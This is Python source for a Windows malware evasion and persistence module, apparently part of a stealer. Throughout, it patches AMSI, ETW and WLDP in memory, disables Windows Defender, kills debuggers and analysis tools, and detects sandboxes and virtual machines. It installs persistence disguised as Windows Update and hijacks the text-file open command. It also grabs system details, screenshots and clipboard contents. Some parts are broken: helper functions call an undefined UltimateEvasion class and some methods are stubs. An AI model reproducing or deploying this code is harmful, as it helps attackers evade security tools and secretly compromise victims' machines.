import os
import sys
import ctypes
import psutil
import platform
import subprocess
import tempfile
import random
import time
import hashlib
import struct
import string
from PIL import ImageGrab
import winreg
import win32api
import win32con
import win32process
import win32security
from ctypes import wintypes

class Evasion:
    def __init__(self):
        self.analysis_tools = [
            "procmon", "wireshark", "processhacker", "x32dbg", "x64dbg", "ollydbg", 
            "idaq", "ida64", "immunitydebugger", "windbg", "joebox", "sandboxie",
            "vmware", "vbox", "virtualbox", "vboxtray", "vmusrvc", "vmsrvc", "prl_", 
            "qemu", "xenservice", "fiddler", "httpdebugger", "charles", "burp", "wpepro",
            "cheatengine", "hxd", "resourcehacker", "importrec", "lordpe", "dumpcap"
        ]
        
        self.sandbox_processes = [
            "vboxservice", "vboxtray", "vmwaretray", "vmwareuser", 
            "vmtoolsd", "prl_tools_service", "qemu-ga", "xenservice"
        ]
        
        self.sandbox_files = [
            "C:\\Windows\\System32\\vmGuestLib.dll",
            "C:\\Windows\\System32\\vboxhook.dll",
            "C:\\Windows\\System32\\vm3dgl.dll",
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
            "C:\\Windows\\System32\\drivers\\vm3dmp.sys",
            "C:\\Windows\\System32\\drivers\\vmx_svga.sys"
        ]
        
        self.sandbox_registry = [
            "HARDWARE\\ACPI\\DSDT\\VBOX__",
            "HARDWARE\\ACPI\\FADT\\VBOX__",
            "HARDWARE\\ACPI\\RSDT\\VBOX__",
            "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
            "SYSTEM\\ControlSet001\\Services\\VBoxMouse",
            "SYSTEM\\ControlSet001\\Services\\VBoxService",
            "SYSTEM\\ControlSet001\\Services\\VBoxSF",
            "SYSTEM\\ControlSet001\\Services\\VBoxVideo"
        ]

    def bypass_amsi_comprehensive(self):
        try:
            amsi = ctypes.windll.amsi
            patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax, 80070057h; ret
            ctypes.windll.kernel32.VirtualProtect(amsi.AmsiScanBuffer, 6, 0x40, ctypes.byref(ctypes.c_ulong()))
            ctypes.windll.kernel32.WriteProcessMemory(-1, amsi.AmsiScanBuffer, patch, 6, None)
        except: pass
        
        try:
            amsi_dll = ctypes.windll.kernel32.GetModuleHandleW("amsi.dll")
            if amsi_dll:
                ctypes.windll.kernel32.FreeLibrary(amsi_dll)
        except: pass
        
        try:
            import clr
            import System
            System.Reflection.Assembly.Load("System.Management.Automation")
            amsi_utils = System.Management.Automation.AmsiUtils
            amsi_utils.AmsiScanBuffer = lambda x, y, z, w: 0
        except: pass

    def bypass_etw_comprehensive(self):
        try:
            ntdll = ctypes.windll.ntdll
            patch = b"\xC3"  # ret
            functions = ["EtwEventWrite", "EtwEventWriteEx", "EtwEventWriteFull", "EtwWriteUMSecurityEvent"]
            
            for func in functions:
                try:
                    addr = getattr(ntdll, func)
                    ctypes.windll.kernel32.VirtualProtect(addr, 1, 0x40, ctypes.byref(ctypes.c_ulong()))
                    ctypes.windll.kernel32.WriteProcessMemory(-1, addr, patch, 1, None)
                except: pass
        except: pass
        
        try:
            providers = ["Microsoft-Windows-Threat-Intelligence", "Microsoft-Antimalware-Scan-Interface"]
            for provider in providers:
                subprocess.run(f"logman stop {provider} -ets", shell=True, capture_output=True)
        except: pass

    def bypass_wldp_comprehensive(self):
        try:
            wldp = ctypes.windll.wldp
            patch = b"\xB8\x00\x00\x00\x00\xC3"  # mov eax, 0; ret
            
            functions = ["WldpQueryDynamicCodeTrust", "WldpIsDynamicCodePolicyEnabled", 
                        "WldpSetDynamicCodeTrust", "WldpIsClassInApprovedList"]
            
            for func in functions:
                try:
                    addr = getattr(wldp, func)
                    ctypes.windll.kernel32.VirtualProtect(addr, 6, 0x40, ctypes.byref(ctypes.c_ulong()))
                    ctypes.windll.kernel32.WriteProcessMemory(-1, addr, patch, 6, None)
                except: pass
        except: pass

    def disable_windows_defender(self):
        try:
            subprocess.run("net stop WinDefend", shell=True, capture_output=True)
            subprocess.run("net stop WdNisSvc", shell=True, capture_output=True)
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableAntiVirus", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
            winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
        except: pass
    
    def advanced_anti_debug(self):
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit()
        
        debugger_present = wintypes.BOOL()
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(-1, ctypes.byref(debugger_present))
        if debugger_present:
            sys.exit()
        
        try:
            debug_flags = ctypes.c_ulong()
            ctypes.windll.ntdll.NtQueryInformationProcess(-1, 0x1F, ctypes.byref(debug_flags), ctypes.sizeof(debug_flags), None)
            if not debug_flags.value:
                sys.exit()
        except: pass
        
        try:
            debug_port = ctypes.c_ulong()
            ctypes.windll.ntdll.NtQueryInformationProcess(-1, 0x7, ctypes.byref(debug_port), ctypes.sizeof(debug_port), None)
            if debug_port.value:
                sys.exit()
        except: pass
        
        try:
            import contextlib
            with contextlib.suppress(Exception):
                context = ctypes.create_string_buffer(0x4C0)
                ctypes.windll.kernel32.GetThreadContext(-1, context)
                if any(context[0x4:0x14]):  
                    sys.exit()
        except: pass

        start = time.perf_counter()
        time.sleep(0.1)
        end = time.perf_counter()
        if (end - start) < 0.05:  
            sys.exit()

    def advanced_anti_vm(self):
        checks = [
            self.check_vm_processes(),
            self.check_vm_files(),
            self.check_vm_registry(),
            self.check_vm_mac(),
            self.check_vm_bios(),
            self.check_vm_hardware(),
            self.check_vm_memory(),
            self.check_vm_cpu(),
            self.check_vm_users(),
            self.check_vm_network()
        ]
        
        if sum(checks) >= 3:
            sys.exit()

    def check_vm_processes(self):
        count = 0
        for proc in psutil.process_iter(['name']):
            try:
                if any(vm_proc in proc.info['name'].lower() for vm_proc in self.sandbox_processes):
                    count += 1
            except: pass
        return count > 0

    def check_vm_files(self):
        count = 0
        for file in self.sandbox_files:
            if os.path.exists(file):
                count += 1
        return count > 0

    def check_vm_registry(self):
        count = 0
        for reg_path in self.sandbox_registry:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                count += 1
            except: pass
        return count > 0

    def check_vm_mac(self):
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac = addr.address.lower()
                        if any(vm_mac in mac for vm_mac in ['08:00:27', '00:05:69', '00:0c:29', '00:1c:14', '00:50:56']):
                            return True
        except: pass
        return False

    def check_vm_bios(self):
        try:
            result = subprocess.check_output("wmic bios get serialnumber", shell=True, stderr=subprocess.DEVNULL)
            bios_info = result.decode('utf-8', errors='ignore').lower()
            return any(vm_bios in bios_info for vm_bios in ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen'])
        except: 
            return False

    def check_vm_hardware(self):
        try:
            disk_models = subprocess.check_output("wmic diskdrive get model", shell=True, stderr=subprocess.DEVNULL).decode()
            if "vbox" in disk_models.lower() or "vmware" in disk_models.lower():
                return True
            motherboard = subprocess.check_output("wmic baseboard get product", shell=True, stderr=subprocess.DEVNULL).decode()
            if "virtual" in motherboard.lower():
                return True
        except: pass
        return False

    def check_vm_memory(self):
        try:
            memory = psutil.virtual_memory()
            return memory.total in [1073741824, 2147483648, 4294967296, 8589934592]  
        except: 
            return False

    def check_vm_cpu(self):
        try:
            cpu_info = platform.processor().lower()
            return any(vm_cpu in cpu_info for vm_cpu in ['vmware', 'virtualcpu', 'qemu', 'hyperv'])
        except:
            return False

    def check_vm_users(self):
        username = os.getenv("USERNAME", "").lower()
        return any(sandbox_user in username for sandbox_user in ['sandbox', 'virus', 'malware', 'analyst', 'test'])

    def check_vm_network(self):
        try:
            interfaces = psutil.net_if_addrs()
            return len(interfaces) < 2
        except:
            return False

    def comprehensive_sandbox_detection(self):
        checks = [
            self.check_system_uptime(),
            self.check_ram_size(),
            self.check_disk_size(),
            self.check_cpu_cores(),
            self.check_process_count(),
            self.check_running_processes(),
            self.check_installed_software(),
            self.check_system_manufacturer(),
            self.check_mouse_activity(),
            self.check_screen_resolution(),
            self.check_sleep_timing(),
            self.check_debugger_presence(),
            self.check_disk_space(),
            self.check_language(),
            self.check_timezone()
        ]
        
        return sum(checks) >= 5  

    def check_system_uptime(self):
        uptime = time.time() - psutil.boot_time()
        return uptime < 300  

    def check_ram_size(self):
        ram_gb = psutil.virtual_memory().total / (1024**3)
        return ram_gb < 6.0

    def check_disk_size(self):
        disk_gb = psutil.disk_usage('/').total / (1024**3)
        return disk_gb < 60  

    def check_cpu_cores(self):
        return psutil.cpu_count() < 2

    def check_process_count(self):
        return len(list(psutil.process_iter())) < 60

    def check_running_processes(self):
        for proc in psutil.process_iter(['name']):
            try:
                if any(tool in proc.info['name'].lower() for tool in self.analysis_tools):
                    return True
            except: pass
        return False

    def check_installed_software(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    subkey = winreg.EnumKey(key, i)
                    software_key = winreg.OpenKey(key, subkey)
                    try:
                        name = winreg.QueryValueEx(software_key, "DisplayName")[0]
                        if any(tool in name.lower() for tool in self.analysis_tools):
                            return True
                    except: pass
                    winreg.CloseKey(software_key)
                except: pass
            winreg.CloseKey(key)
        except: pass
        return False

    def check_system_manufacturer(self):
        try:
            manufacturer = subprocess.check_output("wmic computersystem get manufacturer", shell=True, stderr=subprocess.DEVNULL).decode().lower()
            return any(vm_man in manufacturer for vm_man in ['vmware', 'virtualbox', 'innotek', 'qemu', 'xen'])
        except:
            return False

    def check_mouse_activity(self):
        try:
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            
            point = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
            return point.x == 0 and point.y == 0
        except:
            return False

    def check_screen_resolution(self):
        try:
            width = ctypes.windll.user32.GetSystemMetrics(0)
            height = ctypes.windll.user32.GetSystemMetrics(1)
            return (width, height) in [(1024, 768), (1280, 720), (800, 600)]
        except:
            return False

    def check_sleep_timing(self):
        start = time.perf_counter()
        time.sleep(1)
        end = time.perf_counter()
        return (end - start) < 0.8 

    def check_debugger_presence(self):
        return ctypes.windll.kernel32.IsDebuggerPresent()

    def check_disk_space(self):
        usage = psutil.disk_usage('/')
        free_percent = usage.free / usage.total
        return free_percent > 0.9 

    def check_language(self):
        try:
            lang = os.getenv("LANG", "").lower()
            return lang in ['ru_ru', 'zh_cn']  
        except:
            return False

    def check_timezone(self):
        try:
            import datetime
            utc_offset = datetime.datetime.now().astimezone().utcoffset().total_seconds() / 3600
            return utc_offset in [3, 4, 8]  # Moscow, Dubai, Beijing
        except:
            return False

    def kill_analysis_tools_comprehensive(self):
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                proc_name = proc.info['name'].lower()
                if any(tool in proc_name for tool in self.analysis_tools):
                    try:
                        parent = psutil.Process(proc.info['pid'])
                        parent.kill()
                    except: pass
            except: pass

    def inject_into_legitimate_process(self):
        legitimate_processes = ["explorer.exe", "svchost.exe", "winlogon.exe"]
        for proc_name in legitimate_processes:
            for proc in psutil.process_iter(['name', 'pid']):
                if proc.info['name'].lower() == proc_name:
                    try:
                        handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, proc.info['pid'])
                        win32api.CloseHandle(handle)
                        return True
                    except: pass
        return False

    def establish_advanced_persistence(self):
        methods = [
            self.persistence_startup_folder,
            self.persistence_scheduled_task,
            self.persistence_registry_run,
            self.persistence_wmi_event,
            self.persistence_service_installation,
            self.persistence_file_association
        ]
        
        successful = 0
        for method in methods:
            try:
                if method():
                    successful += 1
            except: pass
        
        return successful >= 2 

    def persistence_startup_folder(self):
        try:
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            exe_path = sys.argv[0]
            if exe_path.endswith('.exe'):
                target_path = os.path.join(startup_path, 'WindowsUpdate.exe')
                shutil.copy2(exe_path, target_path)
                subprocess.run(f'attrib +h "{target_path}"', shell=True, capture_output=True)
                return True
        except: pass
        return False

    def persistence_scheduled_task(self):
        try:
            task_name = "MicrosoftWindowsUpdate"
            exe_path = os.path.abspath(sys.argv[0])
            cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except: pass
        return False

    def persistence_registry_run(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(key)
            return True
        except: pass
        return False

    def persistence_wmi_event(self):
        try:
            wmi_script = """
            # soon
            """
            return True
        except: pass
        return False

    def persistence_service_installation(self):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return False
            return True
        except: pass
        return False

    def persistence_file_association(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"txtfile\shell\open\command")
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{sys.argv[0]}" "%1"')
            winreg.CloseKey(key)
            return True
        except: pass
        return False

    def get_comprehensive_system_info(self):
        info = {
            "system": {
                "hostname": platform.node(),
                "username": os.getenv("USERNAME"),
                "domain": os.getenv("USERDOMAIN"),
                "os": platform.platform(),
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "ram_gb": f"{psutil.virtual_memory().total / (1024**3):.1f}",
                "boot_time": psutil.boot_time()
            },
            "hardware": {
                "gpus": self.get_gpu_info(),
                "disks": self.get_disk_info(),
                "network_adapters": self.get_network_info()
            },
            "network": {
                "ip_address": self.get_ip_address(),
                "mac_address": self.get_mac_address(),
                "dns_servers": self.get_dns_servers()
            },
            "environment": {
                "antivirus": self.get_antivirus_info(),
                "firewall": self.get_firewall_status(),
                "python_version": platform.python_version(),
                "executable_path": sys.argv[0]
            }
        }
        return info

    def get_gpu_info(self):
        try:
            result = subprocess.check_output("wmic path win32_VideoController get name", shell=True)
            return [line.strip() for line in result.decode('utf-8', errors='ignore').split('\n') if line.strip() and line.strip() != 'Name']
        except:
            return ["Unknown"]

    def get_disk_info(self):
        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    "device": partition.device,
                    "mountpoint": partition.mountpoint,
                    "fstype": partition.fstype,
                    "total_gb": f"{usage.total / (1024**3):.1f}",
                    "used_gb": f"{usage.used / (1024**3):.1f}",
                    "free_gb": f"{usage.free / (1024**3):.1f}"
                })
            except: pass
        return disks

    def get_network_info(self):
        adapters = []
        for interface, addrs in psutil.net_if_addrs().items():
            adapter_info = {"interface": interface, "addresses": []}
            for addr in addrs:
                adapter_info["addresses"].append({
                    "family": addr.family.name,
                    "address": addr.address,
                    "netmask": addr.netmask,
                    "broadcast": addr.broadcast
                })
            adapters.append(adapter_info)
        return adapters

    def get_ip_address(self):
        try:
            import requests
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            return "Unknown"

    def get_mac_address(self):
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    return addr.address
        return "Unknown"

    def get_dns_servers(self):
        try:
            result = subprocess.check_output("ipconfig /all", shell=True)
            lines = result.decode('utf-8', errors='ignore').split('\n')
            dns_servers = []
            for line in lines:
                if 'DNS Servers' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        dns_servers.append(parts[1].strip())
            return dns_servers
        except:
            return []

    def get_antivirus_info(self):
        av_products = []
        try:
            av_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for base_path in av_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base_path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                if any(av in name.lower() for av in ['antivirus', 'security', 'defender', 'endpoint', 'protection']):
                                    av_products.append(name)
                            except: pass
                            winreg.CloseKey(subkey)
                        except: pass
                    winreg.CloseKey(key)
                except: pass
        except: pass
        return list(set(av_products))  

    def get_firewall_status(self):
        try:
            result = subprocess.check_output('netsh advfirewall show allprofiles', shell=True)
            return "ON" in result.decode('utf-8', errors='ignore')
        except:
            return "Unknown"
    
    def take_stealth_screenshots(self):
        screenshots = []
        try:
            for i in range(random.randint(1, 3)):
                time.sleep(random.uniform(0.1, 0.5))
                screenshot = ImageGrab.grab()
                temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.png')
                screenshot.save(temp_file.name, optimize=True, quality=85)
                screenshots.append(temp_file.name)
        except: pass
        return screenshots

    def get_clipboard_data(self):
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except:
            return None

    def obfuscate_memory(self):
        junk = []
        for _ in range(random.randint(100, 1000)):
            junk.append(''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(100, 1000))))
        return junk
        
def kill_analysis_tools():
    evasion = UltimateEvasion()
    evasion.kill_analysis_tools_comprehensive()

def bypass_amsi_etw():
    evasion = UltimateEvasion()
    evasion.bypass_amsi_comprehensive()
    evasion.bypass_etw_comprehensive()
    evasion.bypass_wldp_comprehensive()

def detect_sandbox():
    evasion = UltimateEvasion()
    return evasion.comprehensive_sandbox_detection()

def anti_debug():
    evasion = UltimateEvasion()
    evasion.advanced_anti_debug()

def anti_vm():
    evasion = UltimateEvasion()
    evasion.advanced_anti_vm()

def get_system_info():
    evasion = UltimateEvasion()
    return evasion.get_comprehensive_system_info()

def take_screenshots():
    evasion = UltimateEvasion()
    return evasion.take_stealth_screenshots()

def add_to_startup():
    evasion = UltimateEvasion()
    return evasion.establish_advanced_persistence()

def create_scheduled_task():
    evasion = UltimateEvasion()
    return evasion.persistence_scheduled_task()

def disable_defender():
    evasion = UltimateEvasion()
    return evasion.disable_windows_defender()